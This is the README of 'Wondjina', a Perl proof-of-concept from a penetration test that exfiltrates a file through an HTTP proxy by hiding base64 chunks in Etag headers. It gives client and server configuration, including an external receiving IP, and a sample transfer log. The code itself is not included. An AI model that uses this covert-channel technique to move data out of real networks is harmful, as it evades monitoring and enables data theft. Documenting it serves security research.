Wondjina client/server PoC for HTTP Etag tunneling
Author: Maarten Van Horenbeeck [maarten@daemon.be]
URL: http://www.daemon.be/maarten/etagtunnel.html

This tool is provided only as a proof of concept to show that
HTTP tunneling over Etags/If-None-Match headers can easily be
accomplished. It is not a software release.

1. OUTLINE

"In Aboriginal mythology, the Wondjina (or wandjina) were cloud and rain
 spirits who, during the Dream time, painted their images (as humans but
 without mouths) on cave walls. Their ghosts still exist in small ponds."
                        http://en.wikipedia.org/wiki/Wondjina

Wondjina splits a file in short byte-strings (of user-definable
length), encodes them using Base64 and then transmits the file
through an HTTP proxy to a server listening on the internet.

It is not a tool, merely proof of concept code that was created
during a penetration test in which our team was required to 
move a file out of a stringently filtered network. DNS tunneling
was not an option - only HTTP proxies could do external lookups;
regular HTTP tunneling was an issue as request strings were logged.

Not headers though.

2. USE and CONFIGURATION

Requirements: MIME::Base64 Perl module

Run 'wondjinad.pl' on the server, and adjust the following
variables in the Perl file where required:

 $port = 80;
  Port to which to bind.

 $host = '64.246.44.158';
  IP address to bind to.

 $file = 'wondjina.out';
  File to store all received data to.

 $size = '1024';
  Size of random response to generate to client.
  If this is high, the transfer will slow down.

Run 'wondjina.pl' on the client, and adjust the following
variables in the Perl file where required:

 $daemon = '64.246.44.158';
  Destination server to which to tunnel. This can be a host-name
  or IP address. Proxy must be able to resolve this.

 $host = '10.0.0.1';
 $host = '10.0.0.1';
  The IP address of your proxy server.

 $port = 3128;
  The port number of your proxy server.

 $datasource = './wondjina.in';
  The file to be tunneled.

 $header = 90;
  Size of the Etag header. The higher, the more apparent the
  transfer will be, but the faster it will go.

 $file = 'wondjina.txt';
  Filename to request on the Wondjina daemon.

An example of a transaction:

Server:
-------
[root@mojave tunnel]# ./wondjinad.pl
Wondjina server [Web Header Tunneling]
Accepting content on 64.246.44.158 port 80 and storing in wondjina.out

Client:
-------
maarten@qetesh:~$ ./wondjina.pl
Wondjina client [Web Header Tunneling]
Transmitting ./wondjina.in to 64.246.44.158 through 10.0.0.1 port 3128

Processing IyEgL3Vzci9iaW4vcGVybApldmE=
Processing bCAiZXhlYyAvdXNyL2Jpbi9wZXI=
Processing bCAtUyAkMCAkKiIKICAgIGlmIDA=
Processing OwojIENvcHlyaWdodCAoQykgMTk=
[...]

Server:
-------
[...]
Generating 1024 bytes of semi-random data

Processing aCBEcmVwcGVyIDxkcmVwcGVyXEA=
Processing Z251Lm9yZz5cbiI7CgoJZXhpdCA=
Processing MDsKICAgIH0gZWxzaWYgKCRBUkc=
Processing VlswXSBlcSAiLS1oIiB8fCAkQVI=
[...]

Client:
-------
[...]
Processing IiwgaGV4KCRhZGRyKSwgJGFsbG8=
Processing Y2F0ZWR7JGFkZHJ9LAoJCSAgICA=
Processing JHdoZXJld2FzeyRhZGRyfSk7Cgk=
Processing fQogICAgfQp9CnByaW50ICJObyA=
Processing bWVtb3J5IGxlYWtzLlxuIiBpZiA=
Processing KCRhbnl0aGluZyA9PSAwKTsKCmU=
Processing eGl0ICRhbnl0aGluZyAhPSAwOwo=

[~] Transfer completed.
